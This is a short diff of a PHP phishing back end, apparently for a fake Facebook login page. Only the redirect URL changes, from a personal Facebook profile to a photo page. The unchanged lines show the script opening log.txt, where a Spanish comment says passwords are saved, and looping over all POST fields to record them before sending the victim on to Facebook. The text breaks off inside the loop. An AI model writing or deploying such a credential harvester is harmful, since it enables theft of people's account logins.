@@ -1,6 +1,6 @@
 <?php
 	//@Naiv_Sec&Inf
-	header ('Location: https://www.facebook.com/isaac.c.garcia.3 '); //La URL a redireccionar tiene que estar luego de Location:
+	header ('Location: https://www.facebook.com/photo?fbid=898844063574393&set=picfp.100003464244381 '); //La URL a redireccionar tiene que estar luego de Location:
 	$handle = fopen("log.txt", "a"); //Aquí se abre el archivo donde se va a guardar la contraseña
 	//A partír de aquí se escriben las variables que obtiene luego del POST
 	foreach($_POST as $variable => $value) {
